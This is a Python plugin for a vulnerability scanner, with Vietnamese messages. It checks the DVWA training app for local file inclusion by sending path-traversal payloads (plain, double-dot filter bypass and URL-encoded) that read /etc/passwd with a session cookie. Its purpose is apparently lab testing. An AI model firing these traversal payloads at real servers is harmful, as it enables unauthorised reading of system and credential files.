import urllib.request
import re
from typing import Dict, Any
from plugins.base_plugin import BasePlugin

class DVWALFIPlugin(BasePlugin):
    @property
    def METADATA(self) -> Dict[str, Any]:
        return {
            "id": "DVWA-LFI",
            "name": "DVWA Local File Inclusion",
            "cvss_score": 7.5,
            "service": "http",
            "vuln_type": "lfi"
        }

    def match(self, service_info: Dict[str, Any]) -> bool:
        return service_info.get("service","") in ["http","https"]

    def verify(self, target_ip: str, target_port: int, context: Dict[str, Any]) -> Dict[str, Any]:
        cookie = context.get("session_cookie","")
        if not cookie:
            return {"status": "PENDING", "evidence": "Chưa có session cookie"}

        payloads = [
            ("?page=../../../../../../etc/passwd",           "root:x:0:0:", "basic traversal"),
            ("?page=....//....//....//etc/passwd",           "root:x:0:0:", "double-dot bypass"),
            ("?page=..%2F..%2F..%2F..%2Fetc%2Fpasswd",      "root:x:0:0:", "URL encoded traversal"),
        ]

        url_base = f"http://{target_ip}:{target_port}/vulnerabilities/fi/"

        for payload, marker, technique in payloads:
            try:
                url = f"{url_base}{payload}"
                print(f"      [LFI] [{technique}] Payload: {payload}")
                req = urllib.request.Request(url)
                req.add_header("Cookie", cookie)
                resp = urllib.request.urlopen(req, timeout=5)
                body = resp.read().decode('utf-8')
                snippet = body[:200].replace('\n',' ')
                print(f"      [LFI] Response: {snippet[:80]}...")

                if marker in body:
                    passwd_lines = "\n".join(body.split('\n')[:5])
                    print(f"      [LFI] ✓ CONFIRMED với technique: {technique}")
                    return {
                        "status": "CONFIRMED",
                        "evidence": (
                            f"LFI thành công - đọc được file hệ thống.\n"
                            f"      - Technique  : {technique}\n"
                            f"      - Payload    : {payload}\n"
                            f"      - Cookie     : {cookie}\n"
                            f"      - /etc/passwd (5 dòng đầu):\n{passwd_lines}"
                        )
                    }
                else:
                    print(f"      [LFI] ✗ Payload không trigger — thử tiếp")
            except Exception as e:
                print(f"      [LFI] ✗ Error: {e}")

        return {"status": "FALSE_POSITIVE", "evidence": "Tất cả LFI payload không khai thác được"}
